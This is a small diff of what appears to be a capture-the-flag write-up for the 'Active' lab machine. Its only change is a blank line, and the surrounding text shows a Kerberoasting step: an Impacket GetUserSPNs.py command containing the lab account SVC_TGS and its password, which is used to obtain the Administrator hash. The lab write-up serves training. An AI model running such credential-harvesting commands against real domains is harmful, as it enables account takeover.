@@ -166,6 +166,7 @@ I wanted better shell so I tried psexec but it wouldn't work in this case since 
   
 ## Kerberoasting
 Now with the credentials for user **SVC_TGS**, I tried kerberoasting, which gave me hash for user **Administrator**
+
 `GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip dc.active.htb -request`
 
 ![](https://i.imgur.com/4waHocL.png)
